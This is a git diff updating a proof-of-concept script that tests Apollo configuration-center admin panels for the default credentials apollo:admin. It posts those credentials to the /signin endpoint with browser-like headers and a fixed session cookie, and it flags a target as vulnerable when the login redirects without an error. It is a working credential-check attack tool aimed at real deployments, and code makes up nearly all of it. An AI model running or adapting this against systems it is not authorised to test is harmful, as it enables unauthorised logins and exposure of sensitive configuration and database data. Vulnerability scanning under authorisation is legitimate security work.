3151805ae594bad2370e9ecd4f551e64c48c9c14
test <test>
2022-12-05 00:37:16 +0000

    auto updated

--- poc/apollo_weak_passwd.py
+++ poc/apollo_weak_passwd.py
@@ -26,25 +26,27 @@ class Apollo(POCBase):
     # samples = []  # 测试样列,就是用 PoC 测试成功的网站
     # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
     desc = """apollo后台管理存在弱口令,导致任意用户可以轻易爆破出来登录后台,通过后台查看数据库的敏感信息"""  # 漏洞简要描述
-    pocDesc = """直接登录即可"""  # POC用法描述
+    pocDesc = """apollo:admin"""  # POC用法描述
 
     def _check(self):
+        url = self.url.strip()
+        full_url = f"{url}/signin"
         # 漏洞验证代码
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
-        }
-        payload = {
-            "username": "apollo",
-            "password": "admin",
-            "login-submit": "登录"
-        }
+        cookies = {"NG_TRANSLATE_LANG_KEY": "zh-CN", "JSESSIONID": "7D7571D40E4C16EC46C0C84FB3340E80"}
+        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
+                   "Origin": f"{url}", "Content-Type": "application/x-www-form-urlencoded",
+                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
+                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                   "Referer": f"{url}/signin", "Accept-Encoding": "gzip, deflate",
+                   "Accept-Language": "zh-CN,zh;q=0.9,ja;q=0.8", "Connection": "close"}
+        data = {"username": "apollo", "password": "admin", "login-submit": "\xe7\x99\xbb\xe5\xbd\x95"}
         result = []
         try:
-            url = self.url.strip() + "/signin"
-            res = requests.post(url=url, headers=headers, data=payload, verify=False, timeout=9)
-            html = res.text
+            response = requests.post(full_url, headers=headers, cookies=cookies, verify=False, timeout=5, data=data,
+                                     allow_redirects=False)
+            location = response.headers.get("Location", "error")
             # 判断是否存在漏洞
-            if '<html ng-app="index">' in html:
+            if "error" not in location:
                 result.append(url)
         except Exception as e:
             print(e)
@@ -58,7 +60,7 @@ class Apollo(POCBase):
             result['VerifyInfo'] = {}
             result['VerifyInfo']['Info'] = self.name
             result['VerifyInfo']['vul_url'] = self.url
-            result['VerifyInfo']['vul_detail'] = self.desc
+            result['VerifyInfo']['vul_detail'] = self.pocDesc
         return self.parse_verify(result)
 
     def _attack(self):
